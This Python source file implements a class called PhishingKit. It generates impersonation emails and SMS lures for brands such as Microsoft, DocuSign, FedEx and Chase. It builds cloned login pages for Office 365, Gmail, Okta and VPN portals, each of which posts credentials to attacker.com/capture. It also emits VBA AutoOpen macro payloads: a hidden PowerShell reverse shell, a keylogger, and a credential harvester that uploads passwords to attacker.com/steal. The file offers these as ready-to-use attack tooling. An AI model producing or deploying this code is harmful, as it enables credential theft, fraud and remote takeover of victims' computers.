import random
import string
from datetime import datetime


class PhishingKit:
    def __init__(self):
        self.rand = random.Random()

    def email_template(self, style="security_alert", target_name="User", target_email="user@example.com", org="Company"):
        templates = {
            "security_alert": self._security_alert(target_name, org),
            "password_reset": self._password_reset(target_name, org),
            "invoice": self._invoice(target_name, org),
            "doc_share": self._doc_share(target_name, org),
            "docusign": self._docusign(target_name, org),
            "fedex": self._fedex(target_name),
            "voicemail": self._voicemail(target_name),
            "calendar_invite": self._calendar_invite(target_name),
            "compliance": self._compliance(target_name, org),
            "benefits": self._benefits(target_name, org),
            "it_notice": self._it_notice(target_name, org),
            "hr_update": self._hr_update(target_name, org),
            "linkedin": self._linkedin(target_name),
            "teams_notification": self._teams_notification(target_name, org),
            "zoom_invite": self._zoom_invite(target_name),
        }
        return templates.get(style, self._security_alert(target_name, org))

    def _security_alert(self, name, org):
        return f"""From: security@{org.lower().replace(' ', '')}-alerts.com
Subject: [ALERT] Unusual sign-in attempt detected

Dear {name},

We detected a sign-in attempt to your {org} account from an unrecognized device.

Location: Moscow, Russia
IP: 95.31.184.{self.rand.randint(1,255)}
Time: {datetime.now().strftime('%I:%M %p %Z')}

If this wasn't you, secure your account immediately:
https://{org.lower().replace(' ', '')}-security.com/verify

{org} Security Team"""

    def _password_reset(self, name, org):
        return f"""From: it@{org.lower().replace(' ', '')}.com
Subject: Password Expiration Notice — Action Required

Dear {name},

Your {org} account password will expire in 24 hours.
To avoid service interruption, please reset your password now:
https://{org.lower().replace(' ', '')}-portal.com/reset

Do not reply to this automated message.
IT Support Desk"""

    def _invoice(self, name, org):
        amount = self.rand.randint(100, 50000)
        return f"""From: accounting@{org.lower().replace(' ', '')}-billing.com
Subject: Invoice #{self.rand.randint(100000,999999)} — Payment Due

Dear {name},

Invoice #{self.rand.randint(100000,999999)} for ${amount:,}.00 is now available.
Due Date: {datetime.now().strftime('%B %d, %Y')}

View and pay your invoice:
https://billing-{org.lower().replace(' ', '')}.com/invoice

Thank you,
Accounts Receivable"""

    def _doc_share(self, name, org):
        return f"""From: notifications@docs-{org.lower().replace(' ', '')}.com
Subject: {name} shared a document with you

Hi,

{name.split()[0] if ' ' in name else 'A colleague'} has shared the following document with you:

"Q4_Financial_Review_{self.rand.randint(2024,2026)}.xlsx"

Click here to open:
https://docs-{org.lower().replace(' ', '')}.com/shared/{''.join(self.rand.choices(string.ascii_lowercase, k=12))}

This link expires in 7 days.
— Google Docs (via {org})"""

    def _docusign(self, name, org):
        return f"""From: docusign@{org.lower().replace(' ', '')}-esign.com
Subject: Please DocuSign: Employment Agreement Amendment

Dear {name},

{org.upper()} has sent you a document to review and sign:

Document: Employment_Agreement_Amendment_{self.rand.randint(2024,2026)}.pdf
Status: Awaiting Your Signature

Review document:
https://docusign-{org.lower().replace(' ', '')}.com/sign/{''.join(self.rand.choices(string.ascii_lowercase, k=10))}

This is an automated reminder from DocuSign."""

    def _fedex(self, name):
        ref = ''.join(self.rand.choices(string.digits, k=12))
        return f"""From: tracking@fedex-delivery.com
Subject: FedEx Shipment {ref} — Delivery Attempt Failed

Dear Customer,

Your FedEx shipment ({ref}) could not be delivered due to an incomplete address.

Schedule redelivery:
https://fedex-reschedule.com/{ref}

Please confirm within 48 hours or the package will be returned to sender.

Thank you,
FedEx Customer Service"""

    def _voicemail(self, name):
        return f"""From: voicemail@{''.join(self.rand.choices(string.ascii_lowercase, k=8))}.com
Subject: New Voicemail — {self.rand.randint(1,5)}:{self.rand.randint(10,59):02d} min

Hi {name},

You have a new voicemail from +1-555-{self.rand.randint(100,999)}-{self.rand.randint(1000,9999)}.
Duration: {self.rand.randint(1,5)}:{self.rand.randint(10,59):02d}

Listen to your message:
https://voicemail-player.com/msg/{''.join(self.rand.choices(string.ascii_lowercase + string.digits, k=8))}

— Unified Messaging System"""

    def _calendar_invite(self, name):
        return f"""From: calendar@{''.join(self.rand.choices(string.ascii_lowercase, k=6))}.com
Subject: Meeting Invitation: Q4 Strategy Review

Hi {name},

You've been invited to a meeting.

Title: Q4 Strategy Review — {random.choice(['Board Room A', 'Conf Room 3', 'Executive Lounge'])}
Time: {random.choice(['Monday', 'Tuesday', 'Wednesday'])} at {random.choice(['9:00', '10:30', '14:00', '15:30'])} AM/PM

View and RSVP:
https://calendar-invite-{''.join(self.rand.choices(string.ascii_lowercase, k=6))}.com/rsvp/{''.join(self.rand.choices(string.ascii_lowercase + string.digits, k=10))}"""

    def _compliance(self, name, org):
        return f"""From: compliance@{org.lower().replace(' ', '')}.com
Subject: Mandatory Compliance Training — Overdue

Dear {name},

Our records indicate you have not completed the required compliance training.
This is a mandatory requirement per {org} policy.

Deadline: {datetime.now().strftime('%B %d, %Y')}
Status: OVERDUE

Complete training now:
https://{org.lower().replace(' ', '')}-training.com/complete

HR Compliance Department"""

    def _benefits(self, name, org):
        return f"""From: benefits@{org.lower().replace(' ', '')}.com
Subject: Open Enrollment — Action Required

Dear {name},

Open enrollment for 2026 benefits ends this Friday.
You have not yet selected your benefit elections.

Enroll now to avoid a lapse in coverage:
https://{org.lower().replace(' ', '')}-benefits.com/enroll

Your selections will take effect January 1st.
Benefits Administration"""

    def _it_notice(self, name, org):
        return f"""From: it-helpdesk@{org.lower().replace(' ', '')}.com
Subject: IT Notice: Software Update Required

Hi {name},

Your workstation ({random.choice(['WS-', 'LAPTOP-'])}{''.join(self.rand.choices(string.ascii_uppercase + string.digits, k=6))}) has a critical update pending.

Required update: Security Patch KB{self.rand.randint(1000000,9999999)}
Severity: Critical
Deadline: {datetime.now().strftime('%B %d, %Y')}

Install update:
https://{org.lower().replace(' ', '')}-updates.com/deploy

IT Service Desk"""

    def _hr_update(self, name, org):
        return f"""From: hr@{org.lower().replace(' ', '')}.com
Subject: Important: Updated Employee Handbook

Dear {name},

{org} has published its updated Employee Handbook for 2026.
All employees are required to acknowledge receipt of the updated policies.

Review and acknowledge:
https://{org.lower().replace(' ', '')}-hrportal.com/acknowledge

Thank you,
Human Resources"""

    def _linkedin(self, name):
        return f"""From: notifications@linkedin-message.com
Subject: You have {self.rand.randint(1,5)} new messages

Hi {name},

You have unread messages waiting from:
- {random.choice(['Sarah M.', 'James K.', 'Recruiter Pro', 'Tech Corp HR'])} ({random.choice(['CTO', 'VP Eng', 'Recruiter', 'Hiring Manager'])})

Reply to messages:
https://linkedin-messages-{''.join(self.rand.choices(string.ascii_lowercase, k=6))}.com/inbox

— LinkedIn"""

    def _teams_notification(self, name, org):
        return f"""From: teams@{org.lower().replace(' ', '')}-chats.com
Subject: @{name.split()[0] if ' ' in name else 'User'}, you were mentioned in a conversation

Hi {name},

You were mentioned in a conversation in the "{random.choice(['General', 'Security', 'Engineering', 'Leadership'])}" channel.

View message:
https://teams-{org.lower().replace(' ', '')}.com/redirect/{''.join(self.rand.choices(string.ascii_lowercase + string.digits, k=12))}

Microsoft Teams"""

    def _zoom_invite(self, name):
        mid = '-'.join(''.join(self.rand.choices(string.digits, k=3)) for _ in range(3))
        pwd = ''.join(self.rand.choices(string.digits, k=6))
        return f"""From: zoom@zoom-invites-{self.rand.randint(100,999)}.com
Subject: Zoom Meeting Invitation — Conf Call

Hi {name},

You are invited to a Zoom meeting.

Join Zoom Meeting:
https://zoom-invite-{''.join(self.rand.choices(string.ascii_lowercase, k=8))}.com/join/{mid}

Meeting ID: {mid}
Passcode: {pwd}

One tap mobile: +1{''.join(self.rand.choices(string.digits, k=10))},,,{mid}#"""

    def sms_template(self, style="urgent"):
        sms_templates = {
            "urgent": f"SECURITY ALERT: Unusual login detected. Verify now: https://verify-{''.join(self.rand.choices(string.ascii_lowercase, k=6))}.com",
            "delivery": f"FedEx: Your package could not be delivered. Reschedule: https://fedex-{''.join(self.rand.choices(string.ascii_lowercase, k=6))}.com",
            "banking": f"CHASE ALERT: Suspicious transaction ${self.rand.randint(100,5000)}. Dispute: https://chase-{''.join(self.rand.choices(string.ascii_lowercase, k=6))}.com",
            "verification": f"Google: Your verification code is {self.rand.randint(100000,999999)}. If not you: https://google-{''.join(self.rand.choices(string.ascii_lowercase, k=6))}.com",
            "missed_call": f"Missed call from +1-555-{self.rand.randint(100,999)}-{self.rand.randint(1000,9999)}. Listen to voicemail: https://vm-{''.join(self.rand.choices(string.ascii_lowercase, k=6))}.com",
            "covid": f"Your vaccine status has been flagged. Update required: https://health-{''.join(self.rand.choices(string.ascii_lowercase, k=6))}.com",
            "payroll": f"Payroll notification: Your direct deposit info needs verification. Update: https://payroll-{''.join(self.rand.choices(string.ascii_lowercase, k=6))}.com",
        }
        return sms_templates.get(style, sms_templates["urgent"])

    def landing_page_html(self, style="generic", org="Company"):
        if style == "office365":
            return self._o365_login(org)
        elif style == "gmail":
            return self._gmail_login()
        elif style == "generic":
            return self._generic_login(org)
        elif style == "okta":
            return self._okta_login(org)
        elif style == "vpn":
            return self._vpn_login(org)
        return self._generic_login(org)

    def _o365_login(self, org):
        return f"""<!DOCTYPE html>
<html><head><title>Sign in to {org}</title>
<style>
body {{ font-family: 'Segoe UI', sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; }}
.card {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 360px; }}
.logo {{ text-align: center; font-size: 24px; margin-bottom: 20px; }}
input {{ width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }}
button {{ width: 100%; padding: 10px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; }}
</style></head><body>
<div class="card">
<div class="logo">Sign in to {org}</div>
<form action="https://attacker.com/capture" method="POST">
<input type="email" name="username" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
</div></body></html>"""

    def _gmail_login(self):
        return """<!DOCTYPE html>
<html><head><title>Gmail</title>
<style>
body { font-family: 'Google Sans', Arial, sans-serif; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
.card { text-align: center; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; width: 368px; }
.logo { font-size: 22px; margin-bottom: 30px; }
input { width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
</style></head><body>
<div class="card">
<div class="logo">Gmail</div>
<form action="https://attacker.com/capture" method="POST">
<input type="email" name="username" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
</div></body></html>"""

    def _generic_login(self, org):
        return f"""<!DOCTYPE html>
<html><head><title>{org} Portal</title>
<style>
body {{ font-family: Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; }}
.card {{ background: white; padding: 30px; border-radius: 5px; box-shadow: 0 1px 5px rgba(0,0,0,0.15); width: 350px; }}
h2 {{ text-align: center; color: #333; }}
input {{ width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 3px; box-sizing: border-box; }}
button {{ width: 100%; padding: 10px; background: #333; color: white; border: none; border-radius: 3px; cursor: pointer; }}
</style></head><body>
<div class="card">
<h2>{org} Portal</h2>
<form action="https://attacker.com/capture" method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
</div></body></html>"""

    def _okta_login(self, org):
        return f"""<!DOCTYPE html>
<html><head><title>Okta - {org}</title>
<style>
body {{ font-family: 'Open Sans', sans-serif; background: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }}
.card {{ background: white; padding: 40px; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.12); width: 400px; text-align: center; }}
.logo {{ margin-bottom: 20px; font-weight: 300; font-size: 28px; }}
input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #d9d9d9; border-radius: 2px; box-sizing: border-box; }}
button {{ width: 100%; padding: 12px; background: #007dc1; color: white; border: none; border-radius: 2px; cursor: pointer; }}
</style></head><body>
<div class="card">
<div class="logo">Okta</div>
<p>Sign in to {org}</p>
<form action="https://attacker.com/capture" method="POST">
<input type="text" name="username" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
</div></body></html>"""

    def _vpn_login(self, org):
        return f"""<!DOCTYPE html>
<html><head><title>{org} VPN Access</title>
<style>
body {{ font-family: Arial, sans-serif; background: #e8e8e8; display: flex; justify-content: center; align-items: center; height: 100vh; }}
.card {{ background: white; padding: 35px; border-radius: 6px; box-shadow: 0 2px 15px rgba(0,0,0,0.2); width: 380px; }}
h2 {{ text-align: center; color: #2c3e50; }}
input {{ width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }}
button {{ width: 100%; padding: 12px; background: #27ae60; color: white; border: none; border-radius: 4px; cursor: pointer; }}
</style></head><body>
<div class="card">
<h2>{org} VPN Access</h2>
<form action="https://attacker.com/capture" method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password + 2FA Code" required>
<button type="submit">Connect</button>
</form>
<p style="text-align:center;font-size:12px;color:#888;">Secured by Cisco AnyConnect</p>
</div></body></html>"""

    def smtp_config(self, provider="gmail"):
        configs = {
            "gmail": {"host": "smtp.gmail.com", "port": 587, "tls": True},
            "outlook": {"host": "smtp.office365.com", "port": 587, "tls": True},
            "sendgrid": {"host": "smtp.sendgrid.net", "port": 587, "tls": True, "api_key_user": "apikey"},
            "mailgun": {"host": "smtp.mailgun.org", "port": 587, "tls": True},
            "amazon_ses": {"host": "email-smtp.us-east-1.amazonaws.com", "port": 587, "tls": True},
            "custom": {"host": "smtp.attacker-mail.com", "port": 25, "tls": False},
        }
        return configs.get(provider, configs["custom"])

    def macro_payload(self, payload_type="reverse_shell", lhost="127.0.0.1", lport=4444):
        if payload_type == "reverse_shell":
            return f'''Sub AutoOpen()
    Dim Str As String
    Str = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()""
    CreateObject("WScript.Shell").Run Str, 0, False
End Sub'''
        elif payload_type == "keylogger":
            return '''Sub AutoOpen()
    Dim Logger As String
    Logger = "powershell -NoP -NonI -W Hidden -Command ""$f='$env:temp\\kl.log';$k=[Console]::ReadKey($true);Add-Content $f $k.KeyChar;Start-Sleep 1""""
    Do While True
        CreateObject("WScript.Shell").Run Logger, 0, False
    Loop
End Sub'''
        elif payload_type == "cred_harvest":
            return '''Sub AutoOpen()
    Dim PS As String
    PS = "powershell -NoP -NonI -W Hidden -Command ""$c=Get-Credential;$r=''+$c.UserName+':'+$c.GetNetworkCredential().Password;$wc=New-Object Net.WebClient;$wc.UploadString('http://attacker.com/steal',$r)"""
    CreateObject("WScript.Shell").Run PS, 0, False
End Sub'''
        return "' No payload defined"

    def all_templates(self):
        return {
            "email": ["security_alert", "password_reset", "invoice", "doc_share", "docusign",
                       "fedex", "voicemail", "calendar_invite", "compliance", "benefits",
                       "it_notice", "hr_update", "linkedin", "teams_notification", "zoom_invite"],
            "sms": ["urgent", "delivery", "banking", "verification", "missed_call", "covid", "payroll"],
            "landing_pages": ["office365", "gmail", "generic", "okta", "vpn"],
            "macro_types": ["reverse_shell", "keylogger", "cred_harvest"],
        }
